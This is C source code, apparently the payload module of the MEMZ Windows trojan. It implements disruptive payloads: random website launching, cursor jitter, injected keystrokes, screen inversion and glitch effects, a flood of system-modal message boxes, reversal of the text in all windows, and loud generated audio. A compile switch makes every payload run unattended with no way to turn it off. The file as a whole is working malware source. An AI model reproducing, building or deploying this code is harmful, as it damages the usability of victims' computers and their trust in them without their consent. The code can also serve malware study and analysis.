#include "memz.h"

PAYLOAD payloads[] = {
#ifdef CLEAN
	{ payloadHostDefault, (LPVOID)payloadExecute, L"Open random websites/programs", FALSE, 0, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadCursor, L"Random cursor movement", TRUE, 0, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadKeyboard, L"Random keyboard input", FALSE, 0, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadSound, L"Random error sounds", TRUE, 0, 0, 0, 0, 0 },
	{ payloadHostVisual, (LPVOID)payloadInvert, L"Invert Screen", TRUE, 0, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadMessageBox, L"Message boxes", TRUE, 0, 0, 0, 0, 0 },
	{ payloadHostVisual, (LPVOID)payloadDrawErrors, L"Draw error icons", TRUE, 0, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadReverseText, L"Reverse text", FALSE, 0, 0, 0, 0, 0 },
	{ payloadHostVisual, (LPVOID)payloadTunnel, L"Tunnel effect", TRUE, 0, 0, 0, 0, 0 },
	{ payloadHostVisual, (LPVOID)payloadGlitches, L"Screen glitches", TRUE, 0, 0, 0, 0, 0 },
	{ payloadHostCrazyBus, NULL, L"Crazy Bus (Ear Rape)", TRUE, 0, 0, 0, 0, 0 },
#else
	{ payloadHostDefault, (LPVOID)payloadExecute, 30000, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadCursor, 30000, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadKeyboard, 20000, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadSound, 50000, 0, 0, 0, 0 },
	{ payloadHostVisual, (LPVOID)payloadInvert, 30000, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadMessageBox, 20000, 0, 0, 0, 0 },
	{ payloadHostVisual, (LPVOID)payloadDrawErrors, 10000, 0, 0, 0, 0 },
	{ payloadHostDefault, (LPVOID)payloadReverseText, 40000, 0, 0, 0, 0 },
	{ payloadHostVisual, (LPVOID)payloadTunnel, 60000, 0, 0, 0, 0 },
	{ payloadHostVisual, (LPVOID)payloadGlitches, 15000, 0, 0, 0, 0 },
	{ payloadHostCrazyBus, NULL, 1000, 0, 0, 0, 0 },
#endif
};

const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
BOOLEAN enablePayloads = TRUE;

PAYLOADHOST(payloadHostDefault) {
	PAYLOAD *payload = (PAYLOAD*)parameter;

	for (;;) {
#ifdef CLEAN
		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
#endif
			if (payload->delaytime++ >= payload->delay) {
#ifdef CLEAN
				payload->delay = ((PAYLOADFUNCTIONDEFAULT((*)))payload->payloadFunction)(payload->times++, payload->runtime, FALSE);
#else
				payload->delay = ((PAYLOADFUNCTIONDEFAULT((*)))payload->payloadFunction)(payload->times++, payload->runtime);
#endif
				
				payload->delaytime = 0;
			}

			payload->runtime++;
#ifdef CLEAN
		} else {
			 payload->runtime = 0;
			 payload->times = 0;
			 payload->delay = 0;
		}
#endif

		Sleep(10);
	}
}

PAYLOADHOST(payloadHostVisual) {
	PAYLOAD *payload = (PAYLOAD*)parameter;

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	int w = rekt.right - rekt.left;
	int h = rekt.bottom - rekt.top;

	for (;;) {
#ifdef CLEAN
		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
#endif
			if (payload->delaytime++ >= payload->delay) {
#ifdef CLEAN
				payload->delay = ((PAYLOADFUNCTIONVISUAL((*)))payload->payloadFunction)(payload->times++, payload->runtime, FALSE, hwnd, hdc, &rekt, w, h);
#else
				payload->delay = ((PAYLOADFUNCTIONVISUAL((*)))payload->payloadFunction)(payload->times++, payload->runtime, hwnd, hdc, &rekt, w, h);
#endif
				payload->delaytime = 0;
			}

			payload->runtime++;
#ifdef CLEAN
		}
		else {
			payload->runtime = 0;
			payload->times = 0;
			payload->delay = 0;
		}
#endif

		Sleep(10);
	}
}

PAYLOADFUNCTIONDEFAULT(payloadExecute) {
	PAYLOADHEAD

	ShellExecuteA(NULL, "open", (LPCSTR)Sites[random() % SitesLen], NULL, NULL, SW_SHOWDEFAULT);

	out: return 1500.0 / (times / 15.0 + 1) + 100 + (random() % 200);
}

PAYLOADFUNCTIONVISUAL(payloadInvert) {
	PAYLOADHEAD

	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
	
	out: return 100;
}

PAYLOADFUNCTIONDEFAULT(payloadCursor) {
	PAYLOADHEAD

	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)));

	out: return 2;
}

PAYLOADFUNCTIONDEFAULT(payloadMessageBox) {
	PAYLOADHEAD

	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);

	out: return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
}

DWORD WINAPI messageBoxThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
			int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

PAYLOADFUNCTIONDEFAULT(payloadReverseText) {
	PAYLOADHEAD

	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

	out: return 50;
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		strReverseW(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}
	
	GlobalFree(str);

	return TRUE;
}

const char *sounds[] = {
	"SystemHand",
	"SystemQuestion",
	"SystemExclamation"
};

PAYLOADFUNCTIONDEFAULT(payloadSound) {
	PAYLOADHEAD

	// There seems to be a bug where toggling ALL payloads kills the sound output on some systems.
	// I don't know why this happens, but using SND_SYNC seems to fix the bug.
	// But the sound is not not as fast as before. I hope there is another way to fix it without slowing down the payload.
	// As this only happens for the enable-disable part, I will only include that in the clean build as a workaround.
#ifdef CLEAN
	PlaySoundA(sounds[random() % (sizeof(sounds)/sizeof(sounds[0]))], GetModuleHandle(NULL), SND_SYNC);
	out: return random() % 10;
#else
	PlaySoundA(sounds[random() % (sizeof(sounds)/sizeof(sounds[0]))], GetModuleHandle(NULL), SND_ASYNC);
	out: return 20 + (random() % 20);
#endif
}

PAYLOADFUNCTIONVISUAL(payloadGlitches) {
	PAYLOADHEAD

	int x1 = random() % (w - 400);
	int y1 = random() % (h - 400);
	int x2 = random() % (w - 400);
	int y2 = random() % (h - 400);
	int width = random() % 400;
	int height = random() % 400;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);

	out: return 200.0 / (times / 5.0 + 1) + 3;
}

PAYLOADFUNCTIONDEFAULT(payloadKeyboard) {
	PAYLOADHEAD
	
	INPUT input;

	input.type = INPUT_KEYBOARD;
	input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &input, sizeof(INPUT));

	out: return 300 + (random() % 400);
}

PAYLOADFUNCTIONVISUAL(payloadTunnel) {
	PAYLOADHEAD

	StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);

	out: return 200.0 / (times / 5.0 + 1) + 4;
}

PAYLOADFUNCTIONVISUAL(payloadDrawErrors) {
	PAYLOADHEAD

	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;
	
	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
		DrawIcon(hdc, random()%(w-ix), random()%(h-iy), LoadIcon(NULL, IDI_WARNING));
	}

	out: return 2;
}

PAYLOADHOST(payloadHostCrazyBus) {
	PAYLOAD *payload = (PAYLOAD*)parameter;

	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 };

	HWAVEOUT hwo;
	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);

	const int bufsize = 44100 * 30; // 30 Seconds
	char *wavedata = (char *)LocalAlloc(0, bufsize);

	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));

	for (;;) {
#ifdef CLEAN
		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
#endif
			int freq = 0;
			for (int i = 0; i < bufsize; i++) {
				if (i % (44100 / 4) == 0)
					freq = 44100 / ((random() % 4000) + 1000);

				wavedata[i] = (char)(((i % freq) / ((float)freq)) * 100);
			}

#ifdef CLEAN
			waveOutReset(hwo);
#endif
			waveOutWrite(hwo, &hdr, sizeof(hdr));

			while (!(hdr.dwFlags & WHDR_DONE)
#ifdef CLEAN
				&&  (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED)
#endif
				) {
				Sleep(1);
			}

#ifdef CLEAN
			if (!enablePayloads || SendMessage(payload->btn, BM_GETCHECK, 0, NULL) != BST_CHECKED) {
				waveOutPause(hwo);
			}
		} else {
			Sleep(10);
		}
#endif
	}
}